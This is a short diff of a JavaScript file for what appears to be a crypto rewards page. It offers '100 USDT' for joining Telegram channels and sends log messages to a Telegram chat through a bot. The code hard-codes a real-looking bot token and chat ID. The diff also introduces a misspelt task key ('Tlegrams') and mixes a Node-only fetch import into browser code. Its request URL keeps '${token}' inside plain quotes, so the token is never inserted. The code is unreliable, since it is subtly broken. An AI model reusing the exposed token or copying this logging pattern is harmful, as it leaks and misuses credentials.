@@ -1,6 +1,6 @@
 // Sample task dictionary
 const tasks = {
-    "Telegrams": {
+    "Tlegrams": {
         description: "Join Our Telegram Channels",
         reward: "100 USDT",
         links: {
@@ -29,9 +29,10 @@ const tasks = {
 let completedTasks = JSON.parse(localStorage.getItem("completedTasks")) || [];
 
 const sendLogToTelegram = async (message) => {
+    const fetch = await import('node-fetch');
     const token = '7611443536:AAH2b36fd3lTH7SRT9tWvrNx98lUpPiydWc';
     const chatId = '-1002451505040';
-    await fetch('https://api.telegram.org/bot${token}/sendMessage', {
+    await fetch.default('https://api.telegram.org/bot${token}/sendMessage', {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
